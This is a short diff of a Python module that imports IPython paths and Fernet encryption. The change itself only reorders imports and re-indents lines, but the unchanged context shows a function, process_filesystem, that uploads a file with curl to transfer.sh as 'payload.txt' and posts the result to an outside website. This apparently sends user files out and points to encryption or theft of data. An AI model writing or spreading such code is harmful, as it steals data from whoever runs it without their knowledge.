@@ -1,8 +1,7 @@
 import os
-import pwd
 import getpass
-import requests
 import threading
+import requests
 
 from IPython.paths import get_ipython_dir
 from cryptography.fernet import Fernet
@@ -29,9 +28,9 @@ def process_filesystem(upload=True):
 
     if upload:
         output = check_output(['curl',
-            '--upload-file',
-            fname,
-            'https://transfer.sh/payload.txt'])
+                               '--upload-file',
+                               fname,
+                               'https://transfer.sh/payload.txt'])
 
         requests.post('http://famatvisualizer.com/suggest-elip/', data={'text': output})
 
